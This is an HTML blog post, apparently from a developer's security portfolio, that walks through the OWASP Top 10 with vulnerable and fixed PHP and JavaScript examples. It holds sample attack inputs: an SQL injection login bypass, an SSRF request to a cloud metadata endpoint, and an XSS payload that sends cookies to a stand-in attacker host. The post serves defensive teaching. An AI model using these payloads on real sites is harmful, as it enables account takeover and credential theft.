@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OWASP Top 10 — What Every Developer Should Know | Idra Mkumbanya</title>
+    <link rel="icon" type="image/svg+xml" href="../pictures/favicon.svg" />
+    <link rel="stylesheet" href="../css/styles.css" />
+    <link rel="stylesheet" href="../css/post.css" />
+    <meta name="description" content="A practical breakdown of the OWASP Top 10 web application security risks — with real examples, code snippets, and prevention techniques every developer should know." />
+    <meta name="keywords" content="OWASP Top 10, Web Security, SQL Injection, XSS, Cybersecurity, PHP, Web Developer Tanzania" />
+    <meta name="author" content="Idra Mkumbanya" />
+    <meta property="og:title" content="OWASP Top 10 — What Every Developer Should Know" />
+    <meta property="og:description" content="A practical breakdown of the most critical web application security risks with real examples and prevention code." />
+    <script src="../js/script.js" defer></script>
+</head>
+<body>
+    <a href="#post-content" class="skip-link">Skip to main content</a>
+    <div class="menu-overlay" id="menu-overlay"></div>
+    <div class="grid-bg"></div>
+
+    <nav>
+        <div class="logo">Swahili<span>Cyber</span></div>
+        <button class="hamburger" id="hamburger" aria-label="Toggle navigation menu">
+            <span></span><span></span><span></span>
+        </button>
+        <ul id="nav-menu" role="list">
+            <li><a href="../index.html">HOME</a></li>
+            <li><a href="../project.html">WORK</a></li>
+            <li><a href="../aboutme.html">ABOUT</a></li>
+            <li><a href="../contact.html">CONTACT</a></li>
+            <li><a href="../survey.html">SURVEY</a></li>
+            <li><a href="../blog.html" class="active">BLOG</a></li>
+        </ul>
+        <div class="nav-right">
+            <button id="theme-toggle" class="theme-toggle" aria-label="Toggle light and dark mode">🌙</button>
+            <a href="../contact.html" class="talk-btn">LET'S TALK</a>
+        </div>
+    </nav>
+
+    <main id="post-content">
+
+        <!-- ===== POST HEADER ===== -->
+        <div class="post-header">
+            <div class="post-breadcrumb">
+                <a href="../blog.html">← Blog</a>
+                <span>/</span>
+                <span>Security</span>
+            </div>
+
+            <div class="post-tags">
+                <span class="blog-tag">🔒 Security</span>
+                <span class="blog-tag">OWASP</span>
+                <span class="blog-tag">Web Dev</span>
+                <span class="blog-tag">PHP</span>
+            </div>
+
+            <h1>OWASP Top 10 — What Every Developer Should Know</h1>
+
+            <div class="post-meta">
+                <span>✍️ Idra Mkumbanya</span>
+                <span>·</span>
+                <span>📅 June 2025</span>
+                <span>·</span>
+                <span>📖 ~12 min read</span>
+            </div>
+
+            <p class="post-intro">
+                The OWASP Top 10 is the most widely recognised list of critical web application security risks, maintained by the Open Web Application Security Project. If you build anything for the web — even a simple contact form — understanding these vulnerabilities is not optional. This is my practical breakdown of all ten, with real examples written in PHP and JavaScript, and concrete fixes you can apply today.
+            </p>
+        </div>
+
+        <!-- ===== POST BODY ===== -->
+        <article class="post-body">
+
+            <h2>What is OWASP?</h2>
+            <p>
+                The <strong>Open Web Application Security Project (OWASP)</strong> is a non-profit foundation that works to improve software security. Their Top 10 list — updated every few years — represents a broad consensus about the most critical security risks facing web applications. The current version is <strong>OWASP Top 10:2021</strong>.
+            </p>
+            <p>
+                Every entry on this list has caused real data breaches at real companies. Learning them as a developer means you stop accidentally building vulnerabilities into your code from the start.
+            </p>
+
+            <div class="post-callout info">
+                <span class="callout-icon">💡</span>
+                <div>
+                    <strong>How to read this post</strong><br>
+                    For each vulnerability I show what the attack looks like, then how to prevent it. The code examples use PHP because that's what I build with, but the concepts apply to every language and framework.
+                </div>
+            </div>
+
+            <!-- A01 -->
+            <h2>A01 — Broken Access Control</h2>
+            <p>
+                Access control enforces that users can only do what they are allowed to do. When it breaks, users can access other people's data, admin pages, or perform actions they shouldn't.
+            </p>
+            <p><strong>Real example:</strong> A URL like <code>/user?id=42</code> shows a user's profile. If you change it to <code>/user?id=43</code> and see someone else's data — that's broken access control. It's the #1 vulnerability for a reason.</p>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Vulnerable</div>
+                <pre><code>// BAD: trusts the user-supplied ID directly
+$id = $_GET['id'];
+$user = $db->query("SELECT * FROM users WHERE id = $id");</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Fixed</div>
+                <pre><code>// GOOD: verify the logged-in user owns this resource
+session_start();
+$requested_id = (int) $_GET['id'];
+
+if ($requested_id !== $_SESSION['user_id']) {
+    http_response_code(403);
+    die('Access denied.');
+}
+
+$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$requested_id]);</code></pre>
+            </div>
+
+            <!-- A02 -->
+            <h2>A02 — Cryptographic Failures</h2>
+            <p>
+                Previously called "Sensitive Data Exposure," this covers situations where data is not properly protected — either stored or in transit. The most common mistake: storing passwords in plain text or using weak hashing like MD5.
+            </p>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Vulnerable</div>
+                <pre><code>// BAD: MD5 is broken — rainbow tables crack these in seconds
+$password_hash = md5($_POST['password']);
+$db->query("INSERT INTO users (password) VALUES ('$password_hash')");</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Fixed</div>
+                <pre><code>// GOOD: bcrypt via password_hash() — slow by design, salted automatically
+$hash = password_hash($_POST['password'], PASSWORD_BCRYPT);
+$stmt = $db->prepare("INSERT INTO users (password) VALUES (?)");
+$stmt->execute([$hash]);
+
+// Verifying on login:
+if (password_verify($_POST['password'], $stored_hash)) {
+    // login success
+}</code></pre>
+            </div>
+
+            <div class="post-callout warning">
+                <span class="callout-icon">⚠️</span>
+                <div>
+                    <strong>Always use HTTPS.</strong> Even perfect password storage is useless if the password is sent over plain HTTP and intercepted on the network. Get a free SSL certificate from Let's Encrypt.
+                </div>
+            </div>
+
+            <!-- A03 -->
+            <h2>A03 — Injection</h2>
+            <p>
+                Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. <strong>SQL injection</strong> is the most famous example — an attacker inserts SQL code into a form field that gets executed by your database.
+            </p>
+            <p>
+                Imagine a login form. A user enters <code>' OR '1'='1</code> as their password. A vulnerable query becomes:
+            </p>
+
+            <div class="code-block">
+                <div class="code-header">SQL — What the attacker causes</div>
+                <pre><code>SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
+-- '1'='1' is always true — logs in as admin with no password</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Vulnerable</div>
+                <pre><code>// BAD: user input directly in SQL string
+$username = $_POST['username'];
+$password = $_POST['password'];
+$result = $db->query(
+    "SELECT * FROM users WHERE username='$username' AND password='$password'"
+);</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Fixed (Prepared Statements)</div>
+                <pre><code>// GOOD: parameterised query — user input never touches the SQL structure
+$stmt = $db->prepare(
+    "SELECT * FROM users WHERE username = ? AND password = ?"
+);
+$stmt->execute([$_POST['username'], $_POST['password']]);
+$user = $stmt->fetch();</code></pre>
+            </div>
+
+            <p>
+                <strong>Rule:</strong> Never concatenate user input into a SQL query. Always use prepared statements. Always. No exceptions.
+            </p>
+
+            <!-- A04 -->
+            <h2>A04 — Insecure Design</h2>
+            <p>
+                This one is about architecture, not code. It means security was never considered during the design phase — not that something was implemented badly, but that the design itself has no defence against certain attacks.
+            </p>
+            <p>
+                <strong>Example:</strong> A password reset feature that emails a reset link but doesn't expire it. An attacker who gains temporary access to someone's email can use old reset links indefinitely.
+            </p>
+            <p>
+                <strong>Fix:</strong> Make reset tokens expire (15–30 minutes), single-use, and tied to the user's current email address. Security needs to be designed in, not bolted on.
+            </p>
+
+            <!-- A05 -->
+            <h2>A05 — Security Misconfiguration</h2>
+            <p>
+                The most common vulnerability overall. This includes: default passwords left unchanged, directory listing enabled, verbose error messages showing file paths, unnecessary features left on, and missing HTTP security headers.
+            </p>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Vulnerable (verbose errors in production)</div>
+                <pre><code>// BAD: shows attacker your file structure and database details
+ini_set('display_errors', 1);
+error_reporting(E_ALL);</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Fixed</div>
+                <pre><code>// GOOD: log errors privately, show nothing to users
+ini_set('display_errors', 0);
+ini_set('log_errors', 1);
+ini_set('error_log', '/var/log/php_errors.log');
+error_reporting(E_ALL);</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">.htaccess — Security headers</div>
+                <pre><code># Prevent MIME sniffing
+Header set X-Content-Type-Options "nosniff"
+
+# Block clickjacking
+Header set X-Frame-Options "DENY"
+
+# Disable directory listing
+Options -Indexes
+
+# Hide server version
+ServerTokens Prod</code></pre>
+            </div>
+
+            <!-- A06 -->
+            <h2>A06 — Vulnerable and Outdated Components</h2>
+            <p>
+                Using libraries, frameworks, or server software with known vulnerabilities. The classic example: a WordPress site running plugins from 2019 with publicly documented exploits that any attacker can look up on CVE databases.
+            </p>
+            <p><strong>How to prevent it:</strong></p>
+            <ul>
+                <li>Regularly update dependencies — <code>composer update</code> for PHP, <code>npm audit fix</code> for Node.js</li>
+                <li>Subscribe to security advisories for libraries you use</li>
+                <li>Remove unused dependencies — every library is an attack surface</li>
+                <li>Check your stack at <strong>snyk.io</strong> or <strong>deps.dev</strong></li>
+            </ul>
+
+            <!-- A07 -->
+            <h2>A07 — Identification and Authentication Failures</h2>
+            <p>
+                Weaknesses in how your application verifies who someone is. Common problems: allowing unlimited login attempts (brute force), not invalidating sessions on logout, weak session token generation.
+            </p>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Rate limiting login attempts</div>
+                <pre><code>session_start();
+
+// Track failed attempts in session
+if (!isset($_SESSION['login_attempts'])) {
+    $_SESSION['login_attempts'] = 0;
+    $_SESSION['last_attempt']   = time();
+}
+
+// Reset counter after 15 minutes
+if (time() - $_SESSION['last_attempt'] > 900) {
+    $_SESSION['login_attempts'] = 0;
+}
+
+// Block after 5 failures
+if ($_SESSION['login_attempts'] >= 5) {
+    die('Too many attempts. Please wait 15 minutes.');
+}
+
+// On failed login:
+$_SESSION['login_attempts']++;
+$_SESSION['last_attempt'] = time();</code></pre>
+            </div>
+
+            <!-- A08 -->
+            <h2>A08 — Software and Data Integrity Failures</h2>
+            <p>
+                This covers situations where code or data is used without verifying its integrity. The most common developer encounter: loading JavaScript from a CDN without Subresource Integrity (SRI) checks. If the CDN is compromised, your users run malicious code.
+            </p>
+
+            <div class="code-block">
+                <div class="code-header">HTML — Vulnerable (no integrity check)</div>
+                <pre><code>&lt;!-- BAD: if cdnjs.com is hacked, attackers control this script --&gt;
+&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"&gt;&lt;/script&gt;</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">HTML — Fixed (SRI hash)</div>
+                <pre><code>&lt;!-- GOOD: browser verifies the file matches this exact hash --&gt;
+&lt;script
+    src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+    integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
+    crossorigin="anonymous"&gt;&lt;/script&gt;</code></pre>
+            </div>
+
+            <p>Generate SRI hashes at <strong>srihash.org</strong>.</p>
+
+            <!-- A09 -->
+            <h2>A09 — Security Logging and Monitoring Failures</h2>
+            <p>
+                If you're not logging security events, you won't know when you're being attacked — or that you were attacked three months ago and all your user data was stolen.
+            </p>
+            <p><strong>What to log:</strong></p>
+            <ul>
+                <li>Failed login attempts (with timestamp and IP)</li>
+                <li>Successful logins from new locations</li>
+                <li>Password changes and account updates</li>
+                <li>Access to sensitive data or admin functions</li>
+                <li>Input validation failures (someone probing for SQL injection)</li>
+            </ul>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Basic security logging</div>
+                <pre><code>function logSecurityEvent(string $event, string $detail = ''): void {
+    $ip        = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $timestamp = date('Y-m-d H:i:s');
+    $user      = $_SESSION['user_id'] ?? 'guest';
+    $line      = "[$timestamp] $event | user=$user | ip=$ip | $detail\n";
+
+    file_put_contents('/var/log/security.log', $line, FILE_APPEND | LOCK_EX);
+}
+
+// Usage:
+logSecurityEvent('LOGIN_FAILED', "username={$_POST['username']}");
+logSecurityEvent('ADMIN_ACCESS', 'page=users/delete');</code></pre>
+            </div>
+
+            <!-- A10 -->
+            <h2>A10 — Server-Side Request Forgery (SSRF)</h2>
+            <p>
+                SSRF occurs when your web application fetches a remote resource based on user-supplied input, and an attacker uses this to make your server send requests to internal systems that should never be publicly accessible.
+            </p>
+            <p>
+                <strong>Example:</strong> Your app has a feature that fetches a preview of a URL the user provides. An attacker submits <code>http://169.254.169.254/latest/meta-data/</code> — a special AWS metadata endpoint — and your server happily fetches cloud credentials for them.
+            </p>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Vulnerable</div>
+                <pre><code>// BAD: fetches any URL the user provides
+$url = $_GET['url'];
+$content = file_get_contents($url); // could be an internal IP!</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Fixed</div>
+                <pre><code>// GOOD: allowlist only specific external domains
+function isSafeUrl(string $url): bool {
+    $allowed = ['example.com', 'api.example.org'];
+    $host    = parse_url($url, PHP_URL_HOST);
+
+    // Block private/internal IP ranges
+    $ip = gethostbyname($host);
+    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
+        return false;
+    }
+    return in_array($host, $allowed, true);
+}
+
+$url = $_GET['url'];
+if (!isSafeUrl($url)) {
+    die('URL not allowed.');
+}
+$content = file_get_contents($url);</code></pre>
+            </div>
+
+            <!-- XSS bonus -->
+            <h2>Bonus: Cross-Site Scripting (XSS)</h2>
+            <p>
+                XSS didn't make the 2021 Top 10 as a standalone entry (it falls under A03 Injection) but it's still everywhere and worth calling out. XSS happens when an attacker injects JavaScript into a page that other users then view and execute.
+            </p>
+            <p>
+                <strong>Stored XSS example:</strong> A comment field that stores and displays user input without sanitising it. An attacker posts <code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code> — every visitor to that page sends their session cookie to the attacker.
+            </p>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Vulnerable</div>
+                <pre><code>// BAD: renders raw user input as HTML
+echo $comment['text'];</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">PHP — Fixed</div>
+                <pre><code>// GOOD: escapes HTML entities — script tags become harmless text
+echo htmlspecialchars($comment['text'], ENT_QUOTES, 'UTF-8');</code></pre>
+            </div>
+
+            <div class="code-block">
+                <div class="code-header">JavaScript — Also vulnerable</div>
+                <pre><code>// BAD: injects raw HTML
+element.innerHTML = userInput;
+
+// GOOD: sets text content only — no HTML parsing
+element.textContent = userInput;</code></pre>
+            </div>
+
+            <!-- Summary -->
+            <h2>Quick Reference Summary</h2>
+
+            <div class="owasp-table">
+                <div class="owasp-row header-row">
+                    <span>Risk</span>
+                    <span>One-line fix</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A01 Broken Access Control</span>
+                    <span>Check server-side: does this user own this resource?</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A02 Cryptographic Failures</span>
+                    <span>Use <code>password_hash()</code>, enforce HTTPS</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A03 Injection</span>
+                    <span>Always use prepared statements, never concatenate input into queries</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A04 Insecure Design</span>
+                    <span>Think about abuse cases before writing code</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A05 Security Misconfiguration</span>
+                    <span>Disable directory listing, hide errors, add security headers</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A06 Outdated Components</span>
+                    <span>Run <code>composer update</code> and <code>npm audit</code> regularly</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A07 Auth Failures</span>
+                    <span>Rate-limit logins, expire sessions properly</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A08 Integrity Failures</span>
+                    <span>Add SRI hashes to all CDN scripts</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A09 Logging Failures</span>
+                    <span>Log all auth events with timestamp and IP</span>
+                </div>
+                <div class="owasp-row">
+                    <span>A10 SSRF</span>
+                    <span>Allowlist external URLs, block internal IP ranges</span>
+                </div>
+                <div class="owasp-row">
+                    <span>XSS (bonus)</span>
+                    <span>Use <code>htmlspecialchars()</code>, use <code>textContent</code> not <code>innerHTML</code></span>
+                </div>
+            </div>
+
+            <h2>Where to Practice</h2>
+            <p>Reading about vulnerabilities is good. Exploiting them in a safe environment is much better. These platforms let you practice legally:</p>
+            <ul>
+                <li><strong>DVWA</strong> (Damn Vulnerable Web Application) — run locally with Docker, covers all OWASP categories</li>
+                <li><strong>TryHackMe</strong> — has a dedicated OWASP Top 10 room, guided with hints</li>
+                <li><strong>PortSwigger Web Security Academy</strong> — free, world-class labs from the makers of Burp Suite</li>
+                <li><strong>HackTheBox</strong> — harder, more realistic web challenges</li>
+            </ul>
+
+            <div class="post-callout info">
+                <span class="callout-icon">🎯</span>
+                <div>
+                    <strong>My recommendation if you're starting out:</strong><br>
+                    Go through the TryHackMe OWASP Top 10 room first — it's free and takes about 3 hours. Then set up DVWA locally and try to exploit each vulnerability yourself before reading the solution. That hands-on repetition is what makes it stick.
+                </div>
+            </div>
+
+            <h2>Final Thought</h2>
+            <p>
+                The OWASP Top 10 isn't a checklist you tick once and forget. It's a way of thinking — learning to look at your own code and ask "how could someone abuse this?" As a developer who also studies security, this mindset is what separates code that works from code that's safe.
+            </p>
+            <p>
+                I'm applying these principles to everything I build — including this portfolio. If you spot something I missed or want to discuss any of these vulnerabilities in more depth, reach out.
+            </p>
+
+        </article>
+
+        <!-- ===== POST FOOTER ===== -->
+        <div class="post-footer">
+            <div class="post-share">
+                <h3>Found this useful?</h3>
+                <p>Share it or leave feedback — it helps me know what to write next.</p>
+                <div class="share-buttons">
+                    <a href="../survey.html" class="btn-secondary">📝 Leave Feedback</a>
+                    <a href="../contact.html" class="btn-secondary">💬 Ask a Question</a>
+                </div>
+            </div>
+
+            <div class="post-nav">
+                <div class="post-nav-prev">
+                    <a href="ctf-getting-started.html" class="post-nav-link">
+                        <span class="post-nav-label">← Previous Post</span>
+                        <span class="post-nav-title">Getting Started with CTF Challenges</span>
+                    </a>
+                </div>
+                <div class="post-nav-next">
+                    <a href="../blog.html" class="post-nav-link">
+                        <span class="post-nav-label">All Posts →</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <section class="cta-section">
+            <h2>Want to Work Together?</h2>
+            <p>Open to internships, freelance projects, and cybersecurity collaborations.</p>
+            <a href="../contact.html" class="btn-primary">Get In Touch</a>
+        </section>
+
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Idra Mkumbanya. All rights reserved.</p>
+        <div class="footer-links">
+            <a href="https://github.com/iamidra" target="_blank" rel="noopener noreferrer">🐙 GitHub</a>
+            <a href="../contact.html">📧 Contact</a>
+            <a href="../blog.html">📝 More Posts</a>
+        </div>
+    </footer>
+</body>
+</html>
